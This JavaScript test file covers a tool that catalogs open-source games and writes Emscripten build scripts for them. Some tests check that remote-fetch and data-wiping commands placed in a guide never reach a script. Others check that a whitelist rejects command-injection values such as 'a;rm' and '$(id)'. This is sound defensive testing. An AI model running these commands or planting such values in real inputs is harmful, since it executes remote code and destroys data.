// Prateleira (cartoonzine-jogos): node --test test/
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
const P = createRequire(import.meta.url)('../core/prateleira-core.js');

const INFO = {
    name: 'open-tyrian', full_name: 'opentyrian/open-tyrian', html_url: 'https://github.com/opentyrian/open-tyrian',
    description: 'Arcade shooter', homepage: '', default_branch: 'master', created_at: '2008-03-01T00:00:00Z',
    license: { spdx_id: 'GPL-2.0', name: 'GNU GPL v2' }, owner: { login: 'opentyrian' }, topics: ['game']
};

test('prateleira: link do GitHub', () => {
    assert.deepEqual(P.repoDoLink('https://github.com/opentyrian/opentyrian'), { dono: 'opentyrian', repo: 'opentyrian', branch: '' });
    assert.deepEqual(P.repoDoLink('github.com/midzer/opentyrian/tree/emscripten'), { dono: 'midzer', repo: 'opentyrian', branch: 'emscripten' });
    assert.equal(P.repoDoLink('https://github.com/a/b.git').repo, 'b');
    assert.equal(P.repoDoLink('https://gitlab.com/a/b'), null);
    assert.equal(P.idDoNome('OpenTyrian 2000!'), 'opentyrian-2000');
    assert.equal(P.idDoNome('Ação Já'), 'acao-ja');
});

test('prateleira: já existe (id ou repositório)', () => {
    const a = P.analisarRepo({ info: INFO });
    assert.ok(P.jaExiste([{ id: 'open-tyrian' }], a));
    assert.ok(P.jaExiste([{ id: 'x', original: 'https://github.com/OpenTyrian/open-tyrian/' }], a));
    assert.ok(P.jaExiste([{ id: 'x', fonte: 'https://github.com/opentyrian/open-tyrian/tree/emscripten' }], a));
    assert.equal(P.jaExiste([{ id: 'y', original: 'https://github.com/a/b' }], a), null);
});

test('prateleira: insere no jogos.json sem bagunçar', () => {
    const txt = '{\n  "_comentario": "x",\n  "jogos": [\n    { "id": "opentyrian", "nome": "OpenTyrian" },\n    { "id": "neverball", "generos": ["Puzzle"] }\n  ]\n}\n';
    const novo = P.inserirNoJogosJson(txt, { id: 'teste', nome: 'Teste: "um", "b":c', generos: ['A', 'B'], rascunho: true });
    const v = JSON.parse(novo);
    assert.equal(v.jogos.at(-1).nome, 'Teste: "um", "b":c');
    assert.equal(v.jogos.length, JSON.parse(txt).jogos.length + 1);
    assert.ok(novo.startsWith(txt.slice(0, txt.lastIndexOf('}', txt.lastIndexOf(']')) + 1)));   // o que já existia fica igual
    assert.throws(() => P.inserirNoJogosJson(txt, { id: 'opentyrian' }), /Já existe/);
    assert.equal(JSON.parse(P.inserirNoJogosJson('{"jogos":[]}', { id: 'a' })).jogos[0].id, 'a');
});

test('prateleira: situação de cada jogo (fila)', () => {
    const jogos = [{ id: 'a' }, { id: 'b', rascunho: true }, { id: 'c' }, { id: 'd' }, { id: 'e' }];
    const jobs = [{ name: 'lista', status: 'completed', conclusion: 'success' }, { name: 'jogo (a)', status: 'completed', conclusion: 'success' },
        { name: 'jogo (c)', status: 'in_progress', conclusion: null }, { name: 'jogo (d)', status: 'completed', conclusion: 'failure', html_url: 'u' }];
    const st = P.statusDosJogos(jogos, ['a', 'd', 'capas'], jobs).map(s => s.estado);
    assert.deepEqual(st, ['pronto', 'rascunho', 'compilando', 'falhou', 'aguardando']);
    assert.equal(P.statusDosJogos(jogos, ['a', 'd'], jobs)[3].noAr, true);
});

test('prateleira: tirar rascunho sem bagunçar o arquivo', () => {
    const txt = '{\n  "jogos": [\n    { "id": "a", "nome": "A" },\n    { "id": "b", "nome": "B", "rascunho": true },\n    { "id": "c", "rascunho": true }\n  ]\n}\n';
    const novo = P.tirarRascunho(txt, 'b');
    assert.equal(novo, txt.replace(', "rascunho": true }', ' }'));
    const v = JSON.parse(novo); assert.equal(v.jogos[1].rascunho, undefined); assert.equal(v.jogos[2].rascunho, true);
    assert.equal(P.tirarRascunho(txt, 'a'), txt);
    assert.throws(() => P.tirarRascunho(txt, 'zz'), /Não achei/);
});

test('prateleira: ficha para Jogos Web e já cadastrado', () => {
    const j = { id: 'opentyrian', nome: 'OpenTyrian', ano: 1995, licenca: 'GPL-2.0', original: 'https://github.com/opentyrian/opentyrian', descricao: 'Nave de tiro', generos: ['Tiro'], controles: 'teclado', teclas: 'A=Space' };
    const it = P.itemJogosWeb(j, { console: 'web-dos', capas: ['opentyrian.jpg', 'opentyrian-banner.jpg'] });
    assert.deepEqual(it.links, ['https://cartoonzine.github.io/cartoonzine-jogos/opentyrian/']);
    assert.equal(it.console, 'web-dos');
    assert.equal(it.capa, 'https://cartoonzine.github.io/cartoonzine-jogos/capas/opentyrian.jpg');
    assert.equal(it.fundoImagem, 'banner');
    assert.match(it.descricao, /^Nave de tiro\. Jogo livre \(GPL-2\.0\)/);
    assert.equal(P.itemJogosWeb({ id: 'x' }).capa, undefined);
    const indice = [{ caminho: 'conteudo/jogos-web/web-dos/tyrian-opentyrian.json', nome: 'Tyrian (OpenTyrian)' }, { caminho: 'conteudo/jogos-web/web-pc/neverball.json', nome: 'Neverball' }];
    assert.ok(P.jaCadastrado(indice, j));
    assert.ok(P.jaCadastrado(indice, { id: 'nb', nome: 'Neverball' }));
    assert.equal(P.jaCadastrado(indice, { id: 'xgalaga', nome: 'XGalaga' }), null);
    assert.equal(P.jaCadastrado([{ caminho: 'conteudo/jogos/x/opentyrian.json' }], j), null);
});

test('prateleira: remover jogo do jogos.json (vírgulas certas)', () => {
    const txt = '{\n  "jogos": [\n    { "id": "a", "nome": "A {x}" },\n    { "id": "b", "nome": "B \\" } ,",\n      "generos": ["X"] },\n    { "id": "c" }\n  ]\n}\n';
    const semB = P.removerDoJogosJson(txt, 'b');
    assert.equal(semB, '{\n  "jogos": [\n    { "id": "a", "nome": "A {x}" },\n    { "id": "c" }\n  ]\n}\n');
    const semC = P.removerDoJogosJson(txt, 'c');
    assert.deepEqual(JSON.parse(semC).jogos.map(j => j.id), ['a', 'b']);
    assert.ok(/"generos": \["X"\] }\n  \]/.test(semC));
    assert.deepEqual(JSON.parse(P.removerDoJogosJson(txt, 'a')).jogos.map(j => j.id), ['b', 'c']);
    assert.deepEqual(JSON.parse(P.removerDoJogosJson('{"jogos":[{"id":"z"}]}', 'z')).jogos, []);
    assert.throws(() => P.removerDoJogosJson(txt, 'nada'), /Não achei/);
});

test('prateleira: backup e restaurar só o que falta', () => {
    const txt = '{ "jogos": [ { "id": "a", "nome": "A" }, { "id": "b", "nome": "B", "rascunho": true } ] }';
    const bk = P.montarBackup(txt, { a: 'receita a', b: 'receita b' }, '2026-11-05T12:00:00Z');
    assert.equal(bk.data, '2026-11-05T12:00:00.000Z');
    assert.equal(bk.jogos.length, 2);
    const ida = JSON.parse(JSON.stringify(bk));                     // como se viesse do arquivo
    const p1 = P.planoRestauracao(ida, [{ id: 'a' }, { id: 'c' }], ['a', 'c']);
    assert.deepEqual(p1.jogos.map(j => j.id), ['b']);
    assert.equal(p1.jogos[0].rascunho, true);
    assert.deepEqual(p1.arquivos, [{ caminho: 'receitas/b.sh', conteudo: 'receita b' }]);
    const p2 = P.planoRestauracao(ida, [{ id: 'a' }, { id: 'b' }], ['b']);        // a ficha do "a" existe, a receita sumiu
    assert.deepEqual(p2.jogos, []);
    assert.deepEqual(p2.arquivos.map(a => a.caminho), ['receitas/a.sh']);
    assert.deepEqual(P.planoRestauracao(ida, [{ id: 'a' }, { id: 'b' }], ['a', 'b']), { jogos: [], arquivos: [] });
    assert.throws(() => P.planoRestauracao({ jogos: [] }, []), /não é um backup/);
    assert.deepEqual(P.planoRestauracao({ ...ida, jogos: [{ id: '../x' }] }, []).jogos, []);
});

const GUIA_MOG = "# Emscripten\n\n## Build\n\n```\nemmake make\n```\n\n## Link\n\n```\nem++ -flto -O3 -fno-rtti -fno-exceptions sources/*.o -o index.html -sUSE_SDL=2 -sUSE_SDL_IMAGE=2 -sSDL2_IMAGE_FORMATS=pcx -sUSE_SDL_MIXER=2 -sSDL2_MIXER_FORMATS=ogg -sASYNCIFY -sENVIRONMENT=web -sTOTAL_MEMORY=256mb --preload-file graphics/ --preload-file rooms/ --preload-file sound/ --closure 1 -sEXPORTED_RUNTIME_METHODS=['allocate','ALLOC_NORMAL']\n```\n";


// ------------------------------------------------------------------ análise por regras, receitas candidatas, estados
const SHA = 'f88a3aa5005edcaa700f36c988bd245d5bf2b032';
const CMAKE_SDL = 'cmake_minimum_required(VERSION 3.10)\nproject(Jogo)\n# find_package(Boost) só num comentário\nfind_package(SDL2 REQUIRED)\nfind_package(SDL2_mixer REQUIRED)\nadd_executable(open-tyrian src/main.c)\nadd_executable(level-editor tools/ed.c)\ntarget_link_libraries(open-tyrian SDL2::SDL2 SDL2_mixer::SDL2_mixer)\n';
// trechos (fatos de build) do CMakeLists.txt do fork web do AstroMenace
const CMAKE_ASTRO = 'FIND_PACKAGE(SDL2 REQUIRED)\nFIND_PACKAGE(OpenAL REQUIRED)\nFIND_PACKAGE(Freetype REQUIRED)\n    # alut lib + header\n    FIND_LIBRARY(ALUT_LIBRARY alut)\n    FIND_PATH(ALUT_INCLUDE_DIR alut.h\nADD_EXECUTABLE(astromenace ${SOURCES})\n';
const analisa = (extra = {}) => P.analisarRepo(Object.assign({ info: INFO, caminhos: ['CMakeLists.txt', 'src/main.c', 'data/a.png'], arquivos: { 'CMakeLists.txt': CMAKE_SDL }, commit: SHA }, extra));

test('análise: dependências só com evidência (arquivo, linha, regra, confiança) e comentário não conta', () => {
    const a = analisa();
    assert.equal(a.tipo, 'cmake');
    assert.deepEqual(a.dependencias.map(d => d.id), ['sdl2', 'sdl2_mixer']);
    const e = a.evidencias.find(x => x.tipo === 'dependencia' && x.valor === 'SDL2_mixer');
    assert.equal(e.arquivo, 'CMakeLists.txt'); assert.equal(e.linha, 5); assert.equal(e.confianca, 'alta');
    assert.ok(!a.dependencias.some(d => d.id === 'boost'));                       // estava só num comentário
    assert.equal(a.ajustes.alvo, 'open-tyrian');                                   // o editor (ferramenta) não conta
    assert.deepEqual(a.ajustes.dados, ['data@/data']);
    assert.equal(a.classificacao, 'candidata');
    assert.equal(a.commit, SHA);
});

test('análise: build em subpasta, autotools e make', () => {
    const t = P.tipoDoBuild(['README.md', 'trunk/CMakeLists.txt', 'trunk/src/CMakeLists.txt']);
    assert.deepEqual([t.tipo, t.subdir], ['cmake', 'trunk']);
    assert.equal(P.tipoDoBuild(['configure.ac', 'Makefile.am', 'Makefile']).tipo, 'autotools');
    assert.equal(P.tipoDoBuild(['Makefile', 'src/a.c']).tipo, 'make');
    assert.equal(P.tipoDoBuild(['a/b/c/CMakeLists.txt']).tipo, 'desconhecido');      // fundo demais: não chuta
    assert.deepEqual(P.arquivosParaLer(['trunk/CMakeLists.txt', 'x.c', 'EMSCRIPTEN.md', 'CMakeLists.txt']), { build: ['CMakeLists.txt', 'trunk/CMakeLists.txt'], guia: 'EMSCRIPTEN.md' });
});

test('regressão AstroMenace: ALUT sem port = revisão necessária, receita que para (nunca "pronta")', () => {
    const a = analisa({ caminhos: ['CMakeLists.txt', 'src/main.cpp', 'gamedata/x'], arquivos: { 'CMakeLists.txt': CMAKE_ASTRO } });
    assert.deepEqual(a.dependencias.map(d => d.id).sort(), ['alut', 'freetype', 'openal', 'sdl2']);
    assert.equal(a.classificacao, 'revisao');
    assert.match(a.motivos.join(), /ALUT \(freealut\)/);
    const r = P.receitaCandidata(a);
    assert.match(r, /REVISÃO NECESSÁRIA/);
    assert.match(r, /echo "REVISAO: Dependência sem port conhecido no Emscripten: ALUT/);
    assert.match(r, /\nexit 1\n$/);
    assert.ok(!/baixar_commit|cmake --build/.test(r));                                // não finge que compila
    const e = P.entradaJogo(a);
    assert.equal(e.rascunho, true);
    assert.ok(e.revisao.length);
    assert.equal(P.estadoReceita(e, null, 'x'), 'revisao');
    assert.equal(P.estadoReceita(e, { status: 'falhou', headSha: 'x' }, 'x'), 'falhou');
});

test('dependência desconhecida, sem licença, meson e sem commit: revisão', () => {
    assert.equal(analisa({ arquivos: { 'CMakeLists.txt': 'find_package(Qt5 REQUIRED)\n' } }).classificacao, 'revisao');
    assert.equal(analisa({ info: { ...INFO, license: null } }).classificacao, 'revisao');
    assert.equal(analisa({ caminhos: ['meson.build'], arquivos: { 'meson.build': "dependency('sdl2')" } }).classificacao, 'revisao');
    assert.match(analisa({ commit: 'main' }).motivos.join(), /commit exato/);
});

test('receitas candidatas: templates por tipo, flags nos pontos certos, sem || true, sem juntar .o, commit exato', () => {
    const a = analisa();
    const r = P.receitaCandidata(a);
    assert.ok(!/\|\|\s*true/.test(r));
    assert.ok(!/\*\.o|find .*\.o/.test(r));
    assert.match(r, new RegExp('baixar_commit https://github.com/opentyrian/open-tyrian\\.git ' + SHA + '\\n'));
    assert.match(r, /-DCMAKE_C_FLAGS="-sUSE_SDL=2 -sUSE_SDL_MIXER=2"/);
    assert.match(r, /-DCMAKE_EXE_LINKER_FLAGS="-sUSE_SDL=2 -sUSE_SDL_MIXER=2 -sALLOW_MEMORY_GROWTH=1 -sENVIRONMENT=web -sFORCE_FILESYSTEM=1"/);
    assert.match(r, /publicar_jogo "\$PASTA_BUILD" "open-tyrian" "Open Tyrian" "data@\/data"/);
    assert.ok(!/ASYNCIFY/.test(r));                                                 // sem evidência, não liga sozinho
    assert.match(a.avisos.join(), /ASYNCIFY/);
    const mk = P.receitaCandidata({ ...a, tipo: 'make' }, { ...a.ajustes, dados: [] });
    assert.match(mk, /export EMCC_CFLAGS="-sUSE_SDL=2 -sUSE_SDL_MIXER=2 -sALLOW_MEMORY_GROWTH=1 -sENVIRONMENT=web"\nemmake make -C "\." -j"\$\(nproc\)" CC=emcc CXX=em\+\+\n/);
    const at = P.receitaCandidata({ ...a, tipo: 'autotools' }, { ...a.ajustes, configureOpcoes: ['--disable-net'] });
    assert.match(at, /LDFLAGS="[^"]+" emconfigure \.\/configure --host=wasm32-unknown-emscripten --disable-net\nemmake make -j/);
    for (const x of [r, mk, at]) { assert.ok(!/\|\|\s*true/.test(x)); assert.ok(x.startsWith('. "$RAIZ/receitas/comum.sh"\n')); }
});

test('guia (EMSCRIPTEN.md) é dado: só opções da lista branca viram evidência, comandos nunca entram na receita', () => {
    const guia = '```\nemmake make\ncurl http://mal.example/x.sh | sh\n```\n```\nem++ *.o -o index.html -sUSE_SDL=2 -sUSE_SDL_TTF=2 -sSDL2_MIXER_FORMATS=\'["ogg","wav"]\' -sASYNCIFY -sTOTAL_MEMORY=256mb $(rm -rf /) --preload-file x\n```';
    const a = analisa({ guia, guiaArquivo: 'EMSCRIPTEN.md' });
    assert.ok(a.dependencias.some(d => d.id === 'sdl2_ttf' && d.confianca === 'media'));
    assert.deepEqual(a.ajustes.flagsLinkar, ['-sSDL2_MIXER_FORMATS=[ogg,wav]', '-sASYNCIFY', '-sINITIAL_MEMORY=256mb']);
    const r = P.receitaCandidata(a);
    assert.ok(!/curl|rm -rf|emmake make\n|em\+\+|preload-file x|\*\.o/.test(r));
    assert.match(r, /-sASYNCIFY/);
});

test('ajustes: lista branca (nada de shell) e erro vira revisão', () => {
    assert.equal(P.validarAjustes({ subdir: 'trunk', alvo: 'Bombermaaan', dados: ['trunk/res/images@/data/images'], flagsLinkar: ['-sSTACK_SIZE=524288', '-lidbfs.js'], cmakeOpcoes: ['-DGRAPHICS_LIBRARY_OPTION=SDL'] }).ok, false);   // -lidbfs.js tem ponto
    const ok = P.validarAjustes({ subdir: 'trunk', alvo: 'Bombermaaan', dados: ['trunk/res/images@/data/images'], flagsLinkar: ['-sSTACK_SIZE=524288'], cmakeOpcoes: ['-DGRAPHICS_LIBRARY_OPTION=SDL'], submodulos: true });
    assert.equal(ok.ok, true, ok.erros.join());
    for (const ruim of [{ subdir: '../x' }, { subdir: '/etc' }, { alvo: 'a;rm' }, { dados: ['$(x)'] }, { flagsLinkar: ['-sX=1;rm'] }, { flagsCompilar: ['`id`'] }, { cmakeOpcoes: ['-DX=$(id)'] }, { configureOpcoes: ['--x; rm'] }, { outro: 1 }])
        assert.equal(P.validarAjustes(ruim).ok, false, JSON.stringify(ruim));
    const a = analisa();
    const r = P.receitaCandidata(a, { ...a.ajustes, flagsLinkar: ['-sX=1;rm -rf /'] });
    assert.match(r, /#   - Flag de link não permitido/);
    assert.match(r, /echo "REVISAO: ajustes inválidos/);
    assert.ok(!/rm -rf/.test(r.split('\n').filter(l => !l.startsWith('#')).join('\n')));
});

test('estado: previsão ≠ resultado; falha ou validação pendente nunca é "pronta"', () => {
    const j = { id: 'x', rascunho: true };
    const jobs = (c, n, st = 'completed') => [{ name: 'compilar (x)', status: st, conclusion: c, html_url: 'u1' }, { name: 'navegador (x)', status: st, conclusion: n, html_url: 'u2' }, { name: 'compilar (y)', status: 'completed', conclusion: 'success' }];
    const v = (c, n, st, sha = 's2') => Object.assign(P.resumoValidacao(jobs(c, n, st), 'x'), { headSha: sha });
    assert.equal(P.estadoReceita(j, null, 's2'), 'candidata');
    assert.equal(P.estadoReceita(j, v(null, null, 'in_progress'), 's2'), 'validando');
    assert.equal(P.estadoReceita(j, v('failure', 'skipped'), 's2'), 'falhou');
    assert.equal(P.estadoReceita(j, v('success', 'failure'), 's2'), 'falhou');      // compilou mas não abriu no navegador
    assert.equal(P.estadoReceita(j, v('success', 'success'), 's2'), 'pronta');
    assert.equal(P.estadoReceita(j, v('success', 'success', 'completed', 's1'), 's2'), 'candidata');   // receita mudou depois
    assert.equal(P.estadoReceita({ id: 'x' }, null, 's2'), 'publicada');
    assert.equal(P.resumoValidacao([{ name: 'compilar (y)' }], 'x'), null);
    assert.equal(P.resumoValidacao(jobs('failure', 'skipped'), 'x').url, 'u1');
});

test('ficha: sempre rascunho, com commit e ajustes', () => {
    const e = P.entradaJogo(analisa(), { generos: ['Tiro'] });
    assert.equal(e.rascunho, true);
    assert.equal(e.commit, SHA);
    assert.equal(e.ajustes.alvo, 'open-tyrian');
    assert.equal(e.revisao, undefined);
    assert.equal(P.entradaJogo(analisa(), { rascunho: false }).rascunho, true);       // não dá para pular a validação
});

test('SDL 1.2 e SDL2 juntos: fica só o SDL2 (ports de versões diferentes não se misturam)', () => {
    const a = analisa({ caminhos: ['Makefile'], arquivos: { Makefile: 'LIBS=`sdl2-config --libs` -lSDL2_mixer\nOLD=-lSDL -lSDL_mixer -lSDL_image\n' } });
    assert.deepEqual(a.dependencias.map(d => d.id), ['sdl2', 'sdl2_mixer']);
    assert.ok(!/USE_SDL_MIXER=1|USE_SDL=1/.test(P.receitaCandidata(a)));
});

// ------------------------------------------------------------------ dependências externas (manifesto confiável)
const MANIFESTO = [
    { id: 'freealut', nome: 'FreeALUT', repo: 'https://github.com/vancegroup/freealut.git', commit: '8abb4207630fdcb0184d20f3188aac58f581a22c', licenca: 'LGPL-2.0', cabecalhos: ['AL/alut.h'], bibliotecas: ['libalut.a'] },
    { id: 'gl4es', nome: 'GL4ES', repo: 'https://github.com/ptitSeb/gl4es.git', commit: 'c9895df34cd466c23bc60c2bd3db3d87e98fcbe7', licenca: 'MIT', cabecalhos: ['gl4esinit.h'], bibliotecas: ['libGL.a'] }
];

test('AstroMenace com o manifesto: ALUT vira dependência externa fixada (sem regra especial do jogo) e entra na receita com include/lib explícitos', () => {
    const a = analisa({ caminhos: ['CMakeLists.txt', 'gamedata/x'], arquivos: { 'CMakeLists.txt': CMAKE_ASTRO }, manifesto: MANIFESTO });
    assert.equal(a.classificacao, 'candidata');                 // candidata ≠ pronta: só a validação real decide
    assert.deepEqual(a.ajustes.externas, ['freealut']);
    const e = a.evidencias.find(x => x.tipo === 'externa');
    assert.match(e.trecho, /freealut\.git @ 8abb4207630f · LGPL-2\.0/);
    const r = P.receitaCandidata(a, a.ajustes, { manifesto: MANIFESTO });
    assert.match(r, /\ndependencia_externa freealut   #/);
    assert.ok(r.indexOf('dependencia_externa freealut') < r.indexOf('emcmake cmake'));
    assert.match(r, /-DCMAKE_C_FLAGS="-sUSE_SDL=2 -sUSE_FREETYPE=1 \$EXTERNAS_CFLAGS"/);
    assert.match(r, /-DCMAKE_EXE_LINKER_FLAGS="[^"]*-lopenal[^"]* \$EXTERNAS_LIBS" "\$\{EXTERNAS_CMAKE\[@\]\}"/);
    assert.ok(!/ERROR_ON_UNDEFINED_SYMBOLS|\|\|\s*true/.test(r));
    assert.equal(P.estadoReceita(P.entradaJogo(a), null, 'x'), 'candidata');
});

test('GL4ES citado no build: externa do manifesto; dependência fora do manifesto: revisão', () => {
    const a = analisa({ arquivos: { 'CMakeLists.txt': CMAKE_SDL + 'target_link_libraries(open-tyrian ${GL4ES_LIB})\n' }, manifesto: MANIFESTO });
    assert.deepEqual(a.ajustes.externas, ['gl4es']);
    const sem = analisa({ arquivos: { 'CMakeLists.txt': CMAKE_SDL + 'target_link_libraries(open-tyrian ${GL4ES_LIB})\n' } });
    assert.equal(sem.classificacao, 'revisao');
    assert.match(sem.motivos.join(), /GL4ES .*não está no manifesto/);
    const r = P.receitaCandidata(analisa(), { ...analisa().ajustes, externas: ['enet'] }, { manifesto: MANIFESTO });
    assert.match(r, /#   - Dependência externa "enet" não está no manifesto/);
    assert.match(r, /\nexit 1\n$/);
    assert.ok(!/dependencia_externa/.test(r));
});

test('opções que escondem símbolo não resolvido são recusadas', () => {
    const v = P.validarAjustes({ flagsLinkar: ['-sERROR_ON_UNDEFINED_SYMBOLS=0', '-sASYNCIFY'] });
    assert.equal(v.ok, false);
    assert.match(v.erros.join(), /esconde símbolos não resolvidos/);
    assert.deepEqual(v.ajustes.flagsLinkar, ['-sASYNCIFY']);
});
